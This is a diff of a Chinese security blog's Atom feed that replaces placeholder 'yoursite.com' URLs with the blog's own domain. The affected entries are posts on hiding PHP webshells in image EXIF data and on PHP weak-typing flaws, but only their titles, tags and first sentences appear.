+    <link href="http://www.freev.cc/2015/12/11/php%E9%AB%98%E7%BA%A7%E5%9B%BE%E7%89%87%E9%9A%90%E8%97%8F%E9%A9%AC/"/>
+    <id>http://www.freev.cc/2015/12/11/php高级图片隐藏马/</id>
     <published>2015-12-11T07:47:50.000Z</published>
     <updated>2016-09-02T06:16:40.181Z</updated>
     <content type="html"><![CDATA[<h2 id="0x00_EXIF"><a href="#0x00_EXIF" class="headerlink" title="0x00 EXIF"></a>0x00 EXIF</h2><p>Exif是一种图像文件格式，它的数据存储与JPEG格式是完全相同的。实际上Exif格式就是在</p>
@@ -461,14 +461,14 @@ i – 检测图像中的信息是否是用invisible secrets嵌入的。
     <![CDATA[<h2 id="0x00_EXIF"><a href="#0x00_EXIF" class="headerlink" title="0x00 EXIF"></a>0x00 EXIF</h2><p>Exif是一种图像文件格式，它的数据存储与JPEG格式是完全相同的。实际上Exif格]]>
     </summary>
     
-      <category term="渗透技巧" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7/"/>
+      <category term="渗透技巧" scheme="http://www.freev.cc/tags/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7/"/>
     
   </entry>
   
   <entry>
     <title><![CDATA[php弱类型安全]]></title>
-    <link href="http://yoursite.com/2015/12/09/php%E5%BC%B1%E7%B1%BB%E5%9E%8B%E5%AE%89%E5%85%A8/"/>
-    <id>http://yoursite.com/2015/12/09/php弱类型安全/</id>
+    <link href="http://www.freev.cc/2015/12/09/php%E5%BC%B1%E7%B1%BB%E5%9E%8B%E5%AE%89%E5%85%A8/"/>
+    <id>http://www.freev.cc/2015/12/09/php弱类型安全/</id>
     <published>2015-12-09T04:51:21.000Z</published>
     <updated>2016-12-06T05:43:01.439Z</updated>
     <content type="html"><![CDATA[<h2 id="0x00__u7406_u89E3php_u5F31_u7C7B_u578B"><a href="#0x00__u7406_u89E3php_u5F31_u7C7B_u578B" class="headerlink" title="0x00 理解php弱类型"></a>0x00 理解php弱类型</h2><p>php 不会严格检验传入的变量类型，也可以将变量自由的转换类型</p>
@@ -483,7 +483,7 @@ i – 检测图像中的信息是否是用invisible secrets嵌入的。
     <![CDATA[<h2 id="0x00__u7406_u89E3php_u5F31_u7C7B_u578B"><a href="#0x00__u7406_u89E3php_u5F31_u7C7B_u578B" class="headerlink" title="0x00 理解php弱类型"><]]>
     </summary>
     
-      <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
+      <category term="代码审计" scheme="http://www.freev.cc/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
     
   </entry>
   
